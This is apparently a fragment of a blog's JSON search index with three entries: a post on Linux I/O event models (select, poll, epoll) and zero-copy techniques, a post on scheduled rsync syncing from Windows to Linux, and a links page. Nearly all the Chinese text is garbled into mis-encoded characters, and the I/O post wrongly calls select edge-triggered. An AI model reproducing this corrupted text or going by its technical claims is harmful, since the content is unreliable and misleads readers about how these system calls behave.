äº‹ä»¶é©±åŠ¨æ¨¡å‹åº“ï¼Œå¹¶ä¸”åœ¨æ¥å£çš„å®šä¹‰ä¹ŸåŸºæœ¬ç›¸åŒï¼Œåªæ˜¯éƒ¨åˆ†å‚æ•°çš„å«ä¹‰ç•¥æœ‰å·®å¼‚ï¼Œæœ€å¤§å¹¶å‘é™åˆ¶1024ï¼Œæ˜¯æœ€æ—©æœŸçš„äº‹ä»¶é©±åŠ¨æ¨¡å‹ã€‚ 2ã€pollï¼š åœ¨Linux çš„åŸºæœ¬é©±åŠ¨æ¨¡å‹ï¼Œwindowsä¸æ”¯æŒæ­¤é©±åŠ¨æ¨¡å‹ï¼Œæ˜¯selectçš„å‡çº§ç‰ˆï¼Œå–æ¶ˆäº†æœ€å¤§çš„å¹¶å‘é™åˆ¶ï¼Œåœ¨ç¼–è¯‘nginxçš„æ—¶å€™å¯ä»¥ä½¿ç”¨--with-poll_moduleå’Œ--without-poll_moduleè¿™ä¸¤ä¸ªæŒ‡å®šæ˜¯å¦ç¼–è¯‘selectåº“ã€‚ 3ã€epollï¼š epollæ˜¯åº“æ˜¯NginxæœåŠ¡å™¨æ”¯æŒçš„æœ€é«˜æ€§èƒ½çš„äº‹ä»¶é©±åŠ¨åº“ä¹‹ä¸€ï¼Œæ˜¯å…¬è®¤çš„éå¸¸ä¼˜ç§€çš„äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œå®ƒå’Œselectå’Œpollæœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œepollæ˜¯pollçš„å‡çº§ç‰ˆï¼Œä½†æ˜¯ä¸pollæœ‰å¾ˆå¤§çš„åŒºåˆ«. epollçš„å¤„ç†æ–¹å¼æ˜¯åˆ›å»ºä¸€ä¸ªå¾…å¤„ç†çš„äº‹ä»¶åˆ—è¡¨ï¼Œç„¶åæŠŠè¿™ä¸ªåˆ—è¡¨å‘ç»™å†…æ ¸ï¼Œè¿”å›çš„æ—¶å€™åœ¨å»è½®è®­æ£€æŸ¥è¿™ä¸ªè¡¨ï¼Œä»¥åˆ¤æ–­äº‹ä»¶æ˜¯å¦å‘ç”Ÿï¼Œepollæ”¯æŒä¸€ä¸ªè¿›ç¨‹æ‰“å¼€çš„æœ€å¤§äº‹ä»¶æè¿°ç¬¦çš„ä¸Šé™æ˜¯ç³»ç»Ÿå¯ä»¥æ‰“å¼€çš„æ–‡ä»¶çš„æœ€å¤§æ•°ï¼ŒåŒæ—¶epollåº“çš„I/Oæ•ˆç‡ä¸éšæè¿°ç¬¦æ•°ç›®å¢åŠ è€Œçº¿æ€§ä¸‹é™ï¼Œå› ä¸ºå®ƒåªä¼šå¯¹å†…æ ¸ä¸ŠæŠ¥çš„â€œæ´»è·ƒâ€çš„æè¿°ç¬¦è¿›è¡Œæ“ä½œã€‚ 4ã€kqueueï¼š ç”¨äºæ”¯æŒBSDç³»åˆ—å¹³å°çš„é«˜æ ¡äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œä¸»è¦ç”¨åœ¨FreeBSD 4.1åŠä»¥ä¸Šç‰ˆæœ¬ã€OpenBSD 2.0çº§ä»¥ä¸Šç‰ˆæœ¬ï¼ŒNetBSDçº§ä»¥ä¸Šç‰ˆæœ¬åŠMac OS X å¹³å°ä¸Šï¼Œè¯¥æ¨¡å‹ä¹Ÿæ˜¯pollåº“çš„å˜ç§ï¼Œå› æ­¤å’Œepollæ²¡æœ‰æœ¬è´¨ä¸Šçš„åŒºåˆ«ï¼Œéƒ½æ˜¯é€šè¿‡é¿å…è½®è®­æ“ä½œæä¾›æ•ˆç‡ã€‚ 5ã€Iocpï¼š Windowsç³»ç»Ÿä¸Šçš„å®ç°æ–¹å¼ï¼Œå¯¹åº”ç¬¬5ç§ï¼ˆå¼‚æ­¥I/Oï¼‰æ¨¡å‹ã€‚ 6ã€rtsigï¼š ä¸æ˜¯ä¸€ä¸ªå¸¸ç”¨äº‹ä»¶é©±åŠ¨ï¼Œæœ€å¤§é˜Ÿåˆ—1024ï¼Œä¸æ˜¯å¾ˆå¸¸ç”¨ 7ã€/dev/poll: ç”¨äºæ”¯æŒunixè¡ç”Ÿå¹³å°çš„é«˜æ•ˆäº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œä¸»è¦åœ¨Solaris å¹³å°ã€HP/UXï¼Œè¯¥æ¨¡å‹æ˜¯sunå…¬å¸åœ¨å¼€å‘Solarisç³»åˆ—å¹³å°çš„æ—¶å€™æå‡ºçš„ç”¨äºå®Œæˆäº‹ä»¶é©±åŠ¨æœºåˆ¶çš„æ–¹æ¡ˆï¼Œå®ƒä½¿ç”¨äº†è™šæ‹Ÿçš„/dev/pollè®¾å¤‡ï¼Œå¼€å‘äººå‘˜å°†è¦è§è¯†çš„æ–‡ä»¶æè¿°ç¬¦åŠ å…¥è¿™ä¸ªè®¾å¤‡ï¼Œç„¶åé€šè¿‡ioctl()è°ƒç”¨æ¥è·å–äº‹ä»¶é€šçŸ¥ï¼Œå› æ­¤è¿è¡Œåœ¨ä»¥ä¸Šç³»åˆ—å¹³å°çš„æ—¶å€™è¯·ä½¿ç”¨/dev/polläº‹ä»¶é©±åŠ¨æœºåˆ¶ã€‚ 8ã€eventportï¼š è¯¥æ–¹æ¡ˆä¹Ÿæ˜¯sunå…¬å¸åœ¨å¼€å‘Solarisçš„æ—¶å€™æå‡ºçš„äº‹ä»¶é©±åŠ¨åº“ï¼Œåªæ˜¯Solaris 10ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œè¯¥é©±åŠ¨åº“çœ‹é˜²æ­¢å†…æ ¸å´©æºƒç­‰æƒ…å†µçš„å‘ç”Ÿã€‚ å¸¸ç”¨ I/O æ¨¡å‹æ¯”è¾ƒ Selectï¼š POSIXæ‰€è§„å®šï¼Œç›®å‰å‡ ä¹åœ¨æ‰€æœ‰çš„å¹³å°ä¸Šæ”¯æŒï¼Œå…¶è‰¯å¥½è·¨å¹³å°æ”¯æŒä¹Ÿæ˜¯å®ƒçš„ä¸€ä¸ªä¼˜ç‚¹ï¼Œæœ¬è´¨ä¸Šæ˜¯é€šè¿‡è®¾ç½®æˆ–è€…æ£€æŸ¥å­˜æ”¾fdæ ‡å¿—ä½çš„æ•°æ®ç»“æ„æ¥è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†ã€‚ ç¼ºç‚¹ï¼š å•ä¸ªè¿›ç¨‹èƒ½å¤Ÿç›‘è§†çš„æ–‡ä»¶æè¿°ç¬¦çš„æ•°é‡å­˜åœ¨æœ€å¤§é™åˆ¶ï¼Œåœ¨Linuxä¸Šä¸€èˆ¬ä¸º1024ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å®å®šä¹‰FD_SETSIZEï¼Œå†é‡æ–°ç¼–è¯‘å†…æ ¸å®ç°ï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿä¼šé€ æˆæ•ˆç‡çš„é™ä½ å•ä¸ªè¿›ç¨‹å¯ç›‘è§†çš„fdæ•°é‡è¢«é™åˆ¶ï¼Œé»˜è®¤æ˜¯1024ï¼Œä¿®æ”¹æ­¤å€¼éœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸ å¯¹socketæ˜¯çº¿æ€§æ‰«æï¼Œå³é‡‡ç”¨è½®è¯¢çš„æ–¹æ³•ï¼Œæ•ˆç‡è¾ƒä½ select é‡‡å–äº†å†…å­˜æ‹·è´æ–¹æ³•æ¥å®ç°å†…æ ¸å°† FD æ¶ˆæ¯é€šçŸ¥ç»™ç”¨æˆ·ç©ºé—´ï¼Œè¿™æ ·ä¸€ä¸ªç”¨æ¥å­˜æ”¾å¤§é‡fdçš„æ•°æ®ç»“æ„ï¼Œè¿™æ ·ä¼šä½¿å¾—ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´åœ¨ä¼ é€’è¯¥ç»“æ„æ—¶å¤åˆ¶å¼€é”€å¤§ pollï¼š æœ¬è´¨ä¸Šå’Œselectæ²¡æœ‰åŒºåˆ«ï¼Œå®ƒå°†ç”¨æˆ·ä¼ å…¥çš„æ•°ç»„æ‹·è´åˆ°å†…æ ¸ç©ºé—´ï¼Œç„¶åæŸ¥è¯¢æ¯ä¸ªfdå¯¹åº”çš„è®¾å¤‡çŠ¶æ€ å…¶æ²¡æœ‰æœ€å¤§è¿æ¥æ•°çš„é™åˆ¶ï¼ŒåŸå› æ˜¯å®ƒæ˜¯åŸºäºé“¾è¡¨æ¥å­˜å‚¨çš„ å¤§é‡çš„fdçš„æ•°ç»„è¢«æ•´ä½“å¤åˆ¶äºç”¨æˆ·æ€å’Œå†…æ ¸åœ°å€ç©ºé—´ä¹‹é—´ï¼Œè€Œä¸ç®¡è¿™æ ·çš„å¤åˆ¶æ˜¯ä¸æ˜¯æœ‰æ„ä¹‰ pollç‰¹ç‚¹æ˜¯â€œæ°´å¹³è§¦å‘â€ï¼Œå¦‚æœæŠ¥å‘Šäº†fdåï¼Œæ²¡æœ‰è¢«å¤„ç†ï¼Œé‚£ä¹ˆä¸‹æ¬¡pollæ—¶ä¼šå†æ¬¡æŠ¥å‘Šè¯¥fd selectæ˜¯è¾¹ç¼˜è§¦å‘å³åªé€šçŸ¥ä¸€æ¬¡ epollï¼š åœ¨Linux 2.6å†…æ ¸ä¸­æå‡ºçš„selectå’Œpollçš„å¢å¼ºç‰ˆæœ¬ æ”¯æŒæ°´å¹³è§¦å‘LTå’Œè¾¹ç¼˜è§¦å‘ETï¼Œæœ€å¤§çš„ç‰¹ç‚¹åœ¨äºè¾¹ç¼˜è§¦å‘ï¼Œå®ƒåªå‘Šè¯‰è¿›ç¨‹å“ªäº›fdåˆšåˆšå˜ä¸ºå°±ç»ªæ€ï¼Œå¹¶ä¸”åªä¼šé€šçŸ¥ä¸€æ¬¡ ä½¿ç”¨â€œäº‹ä»¶â€çš„å°±ç»ªé€šçŸ¥æ–¹å¼ï¼Œé€šè¿‡epoll_ctlæ³¨å†Œfdï¼Œä¸€æ—¦è¯¥fdå°±ç»ªï¼Œå†…æ ¸å°±ä¼šé‡‡ç”¨ç±»ä¼¼callbackçš„å›è°ƒæœºåˆ¶æ¥æ¿€æ´»è¯¥fdï¼Œepoll_waitä¾¿å¯ä»¥æ”¶åˆ°é€šçŸ¥ ä¼˜ç‚¹: æ²¡æœ‰æœ€å¤§å¹¶å‘è¿æ¥çš„é™åˆ¶ï¼šèƒ½æ‰“å¼€çš„FDçš„ä¸Šé™è¿œå¤§äº1024(1Gçš„å†…å­˜èƒ½ç›‘å¬çº¦10ä¸‡ä¸ªç«¯å£)ï¼Œå…·ä½“æŸ¥çœ‹/proc/sys/fs/file-maxï¼Œæ­¤å€¼å’Œç³»ç»Ÿå†…å­˜å¤§å°ç›¸å…³ æ•ˆç‡æå‡ï¼šéè½®è¯¢çš„æ–¹å¼ï¼Œä¸ä¼šéšç€FDæ•°ç›®çš„å¢åŠ è€Œæ•ˆç‡ä¸‹é™;åªæœ‰æ´»è·ƒå¯ç”¨çš„FDæ‰ä¼šè°ƒç”¨callbackå‡½æ•°ï¼Œå³epollæœ€å¤§çš„ä¼˜ç‚¹å°±åœ¨äºå®ƒåªç®¡ç†â€œæ´»è·ƒâ€çš„è¿æ¥ï¼Œè€Œè·Ÿè¿æ¥æ€»æ•°æ— å…³ å†…å­˜æ‹·è´ï¼Œåˆ©ç”¨mmap(Memory Mapping)åŠ é€Ÿä¸å†…æ ¸ç©ºé—´çš„æ¶ˆæ¯ä¼ é€’;å³epollä½¿ç”¨mmapå‡å°‘å¤åˆ¶å¼€é”€ æ€»ç»“\n1ã€epollåªæ˜¯ä¸€ç»„APIï¼Œæ¯”èµ·selectè¿™ç§æ‰«æå…¨éƒ¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œepollåªè¯»å–å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå†åŠ å…¥åŸºäºäº‹ä»¶çš„å°±ç»ªé€šçŸ¥æœºåˆ¶ï¼Œæ‰€ä»¥æ€§èƒ½æ¯”è¾ƒå¥½ 2ã€åŸºäºepollçš„äº‹ä»¶å¤šè·¯å¤ç”¨å‡å°‘äº†è¿›ç¨‹é—´åˆ‡æ¢çš„æ¬¡æ•°ï¼Œä½¿å¾—æ“ä½œç³»ç»Ÿå°‘åšäº†ç›¸å¯¹äºç”¨æˆ·ä»»åŠ¡æ¥è¯´çš„æ— ç”¨åŠŸã€‚ 3ã€epollæ¯”selectç­‰å¤šè·¯å¤ç”¨æ–¹å¼æ¥è¯´ï¼Œå‡å°‘äº†éå†å¾ªç¯åŠå†…å­˜æ‹·è´çš„å·¥ä½œé‡ï¼Œå› ä¸ºæ´»è·ƒè¿æ¥åªå æ€»å¹¶å‘è¿æ¥çš„å¾ˆå°ä¸€éƒ¨åˆ†ã€‚ èŒƒä¾‹ï¼šæœ€å¤§å¹¶å‘è¿æ¥æ•°å’Œå†…å­˜æœ‰ç›´æ¥å…³ç³»\n#å†…å­˜1G [root@centos8 ~]#free -h total used free shared buff/cache available Mem: 952Mi 168Mi 605Mi 12Mi 178Mi 629Mi Swap: 2.0Gi 0B 2.0Gi [root@centos8 ~]#cat /proc/sys/fs/file-max 92953 #å†…å­˜2G [root@centos8 ~]#free -h total used free shared buff/cache available Mem: 1.9Gi 258Mi 1.3Gi 12Mi 341Mi 1.6Gi Swap: 2.0Gi 0B 2.0Gi [root@centos8 ~]#cat /proc/sys/fs/file-max 195920 èŒƒä¾‹ï¼šå†…æ ¸é™åˆ¶\n[root@centos8 ~]#grep -R FD_SETSIZE linux-5.8/* linux-5.8/Documentation/userspace-api/media/v4l/func-select.rst: ``FD_SETSIZE``. linux-5.8/include/uapi/linux/posix_types.h:#undef __FD_SETSIZE linux-5.8/include/uapi/linux/posix_types.h:#define __FD_SETSIZE 1024 #å•ä¸ªè¿›ç¨‹èƒ½å¤Ÿ ç›‘è§†çš„æ–‡ä»¶æè¿°ç¬¦çš„æ–‡ä»¶æœ€å¤§æ•°é‡ linux-5.8/include/uapi/linux/posix_types.h: unsigned long fds_bits[__FD_SETSIZE / (8 * sizeof(long))]; linux-5.8/tools/include/nolibc/nolibc.h:#define FD_SETSIZE 256 linux-5.8/tools/include/nolibc/nolibc.h:typedef struct { uint32_t fd32[FD_SETSIZE/32]; } fd_set; linux-5.8/tools/include/nolibc/nolibc.h: if (fd \u0026lt; 0 || fd \u0026gt;= FD_SETSIZE) linux-5.8/tools/testing/selftests/net/nettest.c: rc = select(FD_SETSIZE, NULL, \u0026amp;wfd, NULL, tv); èŒƒä¾‹ï¼šselect å’Œ epoll å¸®åŠ©\n[root@centos8 ~]#whatis epoll epoll (7) - I/O event notification facility [root@centos8 ~]#whatis select select (2) - synchronous I/O multiplexing select (3) - synchronous I/O multiplexing select (3p) - synchronous I/O multiplexing [root@centos8 ~]#whatis poll poll (2) - wait for some event on a file descriptor poll (3p) - input/output multiplexing [root@centos8 ~]#man 2 select SELECT(2) Linux Programmer\u0026#39;s Manual SELECT(2) NAME select, pselect, FD_CLR, FD_ISSET, FD_SET, FD_ZERO - synchronous I/O multiplexing [root@centos8 ~]#man 2 poll POLL(2) Linux Programmer\u0026#39;s Manual POLL(2) NAME poll, ppoll - wait for some event on a file descriptor é›¶æ‹·è´ é›¶æ‹·è´ä»‹ç» ä¼ ç»Ÿ Linux çš„I/O é—®é¢˜ ä¼ ç»Ÿçš„ Linux ç³»ç»Ÿçš„æ ‡å‡† I/O æ¥å£ï¼ˆreadã€writeï¼‰æ˜¯åŸºäºæ•°æ®æ‹·è´çš„ï¼Œä¹Ÿå°±æ˜¯æ•°æ®éƒ½æ˜¯ copy_to_user æˆ–è€… copy_from_userï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œé€šè¿‡ä¸­é—´ç¼“å­˜çš„æœºåˆ¶ï¼Œå‡å°‘ç£ç›˜ I/O çš„æ“ä½œï¼Œä½†æ˜¯åå¤„ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå¤§é‡æ•°æ®çš„æ‹·è´ï¼Œç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„é¢‘ç¹åˆ‡æ¢ï¼Œä¼šæ¶ˆè€—å¤§é‡çš„ CPU èµ„æºï¼Œä¸¥é‡å½±å“æ•°æ®ä¼ è¾“çš„æ€§èƒ½ï¼Œç»Ÿè®¡è¡¨æ˜ï¼Œåœ¨Linuxåè®®æ ˆä¸­ï¼Œæ•°æ®åŒ…åœ¨å†…æ ¸æ€å’Œç”¨æˆ·æ€ä¹‹é—´çš„æ‹·è´æ‰€ç”¨çš„æ—¶é—´ç”šè‡³å åˆ°äº†æ•°æ®åŒ…æ•´ä¸ªå¤„ç†æµç¨‹æ—¶é—´çš„57.1%\nä»¥ä¸Šå›¾ä¸ºä¾‹ï¼Œä¸€æ¬¡å®Œæ•´çš„ç½‘ç»œè¯·æ±‚æ¶‰åŠIOæ•°æ®æµå‘ä¸ºï¼šç½‘ç»œåè®®æ ˆ \u0026ndash;\u0026gt; å†…æ ¸ç©ºé—´ \u0026ndash;\u0026gt; ç”¨æˆ·ç©ºé—´ \u0026ndash;\u0026gt; å†…æ ¸ç©ºé—´ \u0026ndash; \u0026gt; ç£ç›˜\u0026ndash; \u0026gt; å†…æ ¸ç©ºé—´\u0026ndash; \u0026gt; ç”¨æˆ·ç©ºé—´\u0026ndash; \u0026gt; å†…æ ¸ç©ºé—´\u0026ndash; \u0026gt; ç½‘ç»œåè®®æ ˆã€‚å¯è§‚å¯Ÿåˆ°ä¸€æ¬¡IOè¿‡ç¨‹ï¼Œæ•°æ®è¢«æ‹·è´äº†å¤šæ¬¡ã€‚\nä»€ä¹ˆæ˜¯é›¶æ‹·è´ é›¶æ‹·è´å°±æ˜¯ä¸Šè¿°é—®é¢˜çš„ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡å°½é‡é¿å…æ‹·è´æ“ä½œæ¥ç¼“è§£ CPU çš„å‹åŠ›ã€‚é›¶æ‹·è´å¹¶æ²¡æœ‰çœŸæ­£åš\nåˆ°â€œ0â€æ‹·è´ï¼Œå®ƒæ›´å¤šæ˜¯ä¸€ç§æ€æƒ³ï¼Œå¾ˆå¤šçš„é›¶æ‹·è´æŠ€æœ¯éƒ½æ˜¯åŸºäºè¿™ä¸ªæ€æƒ³å»åšçš„ä¼˜åŒ–\né›¶æ‹·è´ç›¸å…³æŠ€æœ¯ MMAP ( Memory Mapping ) mmap()ç³»ç»Ÿè°ƒç”¨ä½¿å¾—è¿›ç¨‹ä¹‹é—´é€šè¿‡æ˜ å°„åŒä¸€ä¸ªæ™®é€šæ–‡ä»¶å®ç°å…±äº«å†…å­˜ã€‚æ™®é€šæ–‡ä»¶è¢«æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´åï¼Œè¿›ç¨‹å¯ä»¥å‘è®¿é—®æ™®é€šå†…å­˜ä¸€æ ·å¯¹æ–‡ä»¶è¿›è¡Œè®¿é—®ã€‚\nmmapæ˜¯ä¸€ç§å†…å­˜æ˜ å°„æ–‡ä»¶çš„æ–¹æ³•ï¼Œå³å°†ä¸€ä¸ªæ–‡ä»¶æˆ–è€…å…¶å®ƒå¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå®ç°æ–‡ä»¶ç£ç›˜åœ°å€å’Œè¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ä¸€æ®µè™šæ‹Ÿåœ°å€çš„ä¸€ä¸€å¯¹æ˜ å…³ç³»ã€‚\nå®ç°è¿™æ ·çš„æ˜ å°„å…³ç³»åï¼Œè¿›ç¨‹å°±å¯ä»¥é‡‡ç”¨æŒ‡é’ˆçš„æ–¹å¼è¯»å†™æ“ä½œè¿™ä¸€æ®µå†…å­˜ï¼Œè€Œç³»ç»Ÿä¼šè‡ªåŠ¨å›å†™è„é¡µé¢åˆ°å¯¹åº”çš„æ–‡ä»¶ç£ç›˜ä¸Šï¼Œå³å®Œæˆäº†å¯¹æ–‡ä»¶çš„æ“ä½œè€Œä¸å¿…å†è°ƒç”¨read,writeç­‰ç³»ç»Ÿè°ƒç”¨å‡½æ•°ã€‚ç›¸åï¼Œå†…æ ¸ç©ºé—´å¯¹è¿™æ®µåŒºåŸŸçš„ä¿®æ”¹ä¹Ÿç›´æ¥åæ˜ ç”¨æˆ·ç©ºé—´ï¼Œä»è€Œå¯ä»¥å®ç°ä¸åŒè¿›ç¨‹é—´çš„æ–‡ä»¶å…±äº«ã€‚\nå†…å­˜æ˜ å°„å‡å°‘æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´çš„æ‹·è´æ“ä½œ,é€‚åˆå¤§é‡æ•°æ®ä¼ è¾“ã€‚\nä»¥ä¸Šå›¾ä¸ºä¾‹ï¼Œç½‘ç»œè¯·æ±‚åˆ°è¾¾å†…æ ¸ç©ºé—´ï¼ˆSocketç¼“å­˜ï¼‰åä¸å†éœ€è¦copyåˆ°ç”¨æˆ·ç©ºé—´ï¼Œå†…å­˜æ˜ å°„ä½¿å¾—ç”¨æˆ·ç©ºé—´è¿›ç¨‹ç›´æ¥æ“ä½œå†…æ ¸ç©ºé—´çš„æ•°æ®ï¼Œåœ¨å¤„ç†å®Œè¯·æ±‚åï¼Œè¿”å›æ•°æ®æ—¶ä¹Ÿç›´æ¥ä»å†…æ ¸ç©ºé—´ï¼ˆKernerlç¼“å­˜ï¼‰æ‹·è´åˆ°Socketç¼“å­˜ï¼Œå†ä¸€æ¬¡å‡å°‘äº†å†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´æ•°æ®äº¤æ¢çš„è¿‡ç¨‹ã€‚\nä¸Šé¢å·¦å›¾ä¸ºä¼ ç»Ÿè¯»å†™,å³å›¾ä¸ºMMAP.ä¸¤è€…ç›¸æ¯”mmapè¦æ¯”æ™®é€šçš„readç³»ç»Ÿè°ƒç”¨å°‘äº†ä¸€æ¬¡copyçš„è¿‡ç¨‹ã€‚å› ä¸ºreadè°ƒç”¨ï¼Œè¿›ç¨‹æ˜¯æ— æ³•ç›´æ¥è®¿é—®kernel spaceçš„ï¼Œæ‰€ä»¥åœ¨readç³»ç»Ÿè°ƒç”¨è¿”å›å‰ï¼Œå†…æ ¸éœ€è¦å°†æ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°è¿›ç¨‹æŒ‡å®šçš„bufferã€‚ä½†mmapä¹‹åï¼Œè¿›ç¨‹å¯ä»¥ç›´æ¥è®¿é—®mmapçš„æ•°æ®(page cache)ã€‚\nSENDFIRL å®ç°æ•ˆæœä¸MMAPç±»ä¼¼ï¼Œå‡å°‘äº†ç”¨æˆ·ç©ºé—´å’Œå†…å­˜ç©ºé—´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆæ•°æ®æ‹·è´ï¼‰\nDMA è¾…åŠ©çš„ SENDFILE Kernel åˆ° Sockert åªéœ€è¦ä¼ è¾“æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ•°æ®ç›´æ¥é€šè¿‡DMAæ‹·è´åˆ°ç½‘ç»œåè®®æ ˆã€‚\n","permalink":"https://senmer.github.io/zh/posts/tech/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/","summary":"\u003cp\u003eæœ¬èŠ‚å†…å®¹ä¸»è¦ç”¨äºç†è§£Linuxçš„I/Oæ¨¡å‹ï¼Œä»¥ä¾¿æ›´å¥½åœ°ç†è§£Nginxæ¶æ„ã€‚\u003c/p\u003e","title":"IOæ¨¡å‹ä¸é›¶æ‹·è´"},{"content":"åˆ©ç”¨rsyncå®ç°windowså®šæ—¶å‘linuxåŒæ­¥æ•°æ®ï¼ˆå¢é‡åŒæ­¥ï¼‰\nwindowsåŒæ­¥Linuxæ•°æ® 1ã€Linuxå®‰è£…rsyncæœåŠ¡ç«¯\nyum -y install rsync å‡†å¤‡é…ç½®æ–‡ä»¶ vim /etc/rsyncd.conf uid = root gid = root use chroot = no max connections = 2 pid file = /var/run/rsyncd.pid exclude = lost+found/ transfer logging = yes timeout = 900 ignore nonreadable = yes dont compress = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2 [rsync] path = /data/mysql/backup hosts allow = 172.20.20.0/24 auth user = rsync secrets file = /etc/rsync.txt read only = yes #é…ç½®æ–‡ä»¶è¯¦è§£ [rsync] #æ˜¯åŒæ­¥ç›®å½•çš„ä¸€ä¸ªåˆ«åï¼Œpathå¯¹åº”å®é™…æ•°æ®æ‰€åœ¨è·¯å¾„ hosts.allow #å“ªä¸ªç½‘ç»œå†…çš„ä¸»æœºå¯è®¿é—®è¯¥æœåŠ¡ secrets file #è´¦æˆ·è®¤è¯æ–‡ä»¶è·¯å¾„ï¼Œè¯¥æ–‡ä»¶å­˜æ”¾äº†è‡ªå®šä¹‰çš„ç”¨äºåŒæ­¥çš„è´¦å·ä¿¡æ¯ï¼ˆæ ¼å¼ä¸ºï¼šè´¦å·ï¼šå¯†ç ï¼Œå¤šä¸ªè´¦å·å†™å¤šè¡Œå³å¯ï¼‰ read only = yes #è¡¨ç¤ºå®¢æˆ·ç«¯åªèƒ½ä¸‹è½½æœåŠ¡ç«¯çš„æ–‡ä»¶è€Œä¸èƒ½ä¸Šä¼ (å•å‘åŒæ­¥) è¿™åº”è¯¥æ˜¯å¤§éƒ¨åˆ†ä¸šåŠ¡çš„éœ€æ±‚,å¦‚æœæœ‰ä¸Šä¼ éœ€è¦,è®¾ç½®read only = no å³å¯ #å‡†å¤‡è´¦å·è®¤è¯æ–‡ä»¶ vim /etc/rsync.txt chmod 600 /etc/rsync.txt #æ­¤æ­¥éª¤å¿…é¡»ï¼Œå¦åˆ™å®¢æˆ·ç«¯åŒæ­¥æ—¶ä¼šæç¤ºauth failed echo \u0026#34;rsync:passwd\u0026#34; \u0026gt; /etc/rsync.txt #å¯åŠ¨æœåŠ¡ systemctl enable rsyncd --now 2ã€windowså®‰è£…rsyncå®¢æˆ·ç«¯\nä¸‹è½½åœ°å€ï¼šhttps://itefix.net/dl/free-software/cwrsync_6.2.4_x64_free.zip è§£å‹åˆ°æŒ‡å®šç›®å½•åå°†binç›®å½•çš„è·¯å¾„æ·»åŠ åˆ°pathç¯å¢ƒå˜é‡å®Œæˆå®‰è£… 3ã€windowså®¢æˆ·ç«¯åŒæ­¥å‘½ä»¤\nrsync --list-only rsync@172.20.20.20::rsync --password-file=/cygdrive/d/rsyncpwd.txt #æŸ¥çœ‹æœåŠ¡ç«¯æœ‰å“ªäº›æ•°æ® rsync -av --delete rsync@172.20.20.20::rsync /cygdrive/d/mysql_backup/ --password-file=/cygdrive/d/rsyncpwd.txt æ³¨æ„ï¼š/cygdrive/d/mysql_backup/ #è¯¥å†™æ³•è¡¨ç¤ºè·¯å¾„(æœ¬åœ°æ•°æ®å­˜æ”¾è·¯å¾„ï¼‰ï¼šD:\\mysql_bakcup\\ ç›¸å…³å‚æ•°ï¼š --delete è¡¨ç¤ºåˆ é™¤æœ¬åœ°tmpfolderç›®å½•ä¸­è·ŸæœåŠ¡å™¨test01ä¸‹ä¸ä¸€è‡´çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½• --password æŒ‡å®šå­˜æ”¾äº†å¯†ç çš„æ–‡ä»¶è·¯å¾„ï¼ˆç”¨äºéäº¤äº’å¼åŒæ­¥æ•°æ®ï¼‰ -v è¡¨ç¤ºé‡‡ç”¨å¢é‡çš„æ–¹å¼åŒæ­¥æ–‡ä»¶ -a æ˜¯ archive mode; same as -rlptgoD; ç›¸å½“äºç®€å†™äº†å¾ˆå¤šå‚æ•° -u, --update å¿½ç•¥å®¢æˆ·ç«¯ä¸Š(æ¯”æœåŠ¡ç«¯)æ›´åŠ æ–°çš„æ–‡ä»¶ -r, --recursive é€’å½’åŒæ­¥ç›®å½• -z, --compress ä¼ è¾“æ—¶å‹ç¼©æ–‡ä»¶æ•°æ® 4ã€windowsè®¾ç½®è®¡åˆ’ä»»åŠ¡ï¼Œå®šæ—¶åŒæ­¥æ•°æ®ï¼š\nè„šæœ¬å†…å®¹ï¼š\n@echo off rsync -av --delete 172.20.20.20::rsync /cygdrive/d/mysql_backup/ --password-file=/cygdrive/d/rsyncpwd.txt ","permalink":"https://senmer.github.io/zh/posts/tech/data_sync/windows%E5%90%91linux%E5%90%8C%E6%AD%A5%E6%95%B0%E6%8D%AE/","summary":"\u003cp\u003eåˆ©ç”¨rsyncå®ç°windowså®šæ—¶å‘linuxåŒæ­¥æ•°æ®ï¼ˆå¢é‡åŒæ­¥ï¼‰\u003c/p\u003e","title":"windowså‘linuxåŒæ­¥æ•°æ®"},{"content":" WZ\u0026#39;s Blog ä¸€ä¸ªè®°å½•æŠ€æœ¯ã€é˜…è¯»ã€ç”Ÿæ´»çš„åšå®¢ åç§°ï¼š nier ç½‘å€ï¼š https://senmer.github.io å›¾æ ‡ï¼š https://sernmer.github/img/Q.gif æè¿°ï¼š ä¸€ä¸ªè®°å½•æŠ€æœ¯ã€é˜…è¯»ã€ç”Ÿæ´»çš„åšå®¢ ","permalink":"https://senmer.github.io/zh/links/","summary":"WZ\u0026#39;s Blog ä¸€ä¸ªè®°å½•æŠ€æœ¯ã€é˜…è¯»ã€ç”Ÿæ´»çš„åšå®¢ åç§°ï¼š nier ç½‘å€ï¼š https://senmer.github.io å›¾æ ‡ï¼š https://sernmer.github/img/Q.gif æè¿°ï¼š 